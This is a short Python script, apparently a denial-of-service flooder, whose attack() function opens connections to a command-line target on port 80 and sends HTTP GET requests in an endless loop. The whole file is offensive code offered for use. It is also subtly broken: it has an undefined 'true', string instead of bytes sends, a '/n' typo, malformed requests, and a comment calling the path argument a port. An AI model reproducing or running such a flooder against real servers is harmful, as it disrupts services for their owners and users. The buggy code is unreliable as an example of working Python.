
import socket
import sys
import os

def attack():
	'''creating connection to send to the specified address 
    to the port infinitly'''
	connection= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection.connect((sys.argv[1],80))

	#The sys.argv 2 is the port to flood with requests
	print("GET "+ sys.argv[2] + "HTTP")

	#sending requests
	connection.send("GET " + sys.argv[2] + "HTTP \n")
	connection.send("HOST :  "+ sys.argv[1]+ "/n")
	connection.close()

while(true):
	attack();





